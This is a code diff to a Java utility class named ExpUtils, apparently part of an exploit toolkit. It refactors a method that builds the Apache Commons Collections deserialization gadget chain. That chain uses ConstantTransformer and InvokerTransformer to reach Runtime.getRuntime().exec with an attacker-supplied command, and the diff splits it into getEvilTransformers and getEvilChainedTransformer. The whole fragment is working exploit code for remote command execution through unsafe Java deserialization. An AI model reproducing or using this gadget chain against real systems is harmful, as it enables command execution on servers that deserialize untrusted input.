@@ -102,15 +102,18 @@ public class ExpUtils {
         return queue;
     }
 
-//    common collecions
-    public static ChainedTransformer getEvilChainedTransformer(){
-        Transformer[] transformers = new Transformer[]{
+    public static Transformer[] getEvilTransformers(){
+        return new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                 new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                 new InvokerTransformer("exec",new Class[]{String.class},new Object[]{cmd})
         };
-        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+    }
+
+    //    common collecions
+    public static ChainedTransformer getEvilChainedTransformer(){
+        ChainedTransformer chainedTransformer = new ChainedTransformer(getEvilTransformers());
         return chainedTransformer;
     }
 
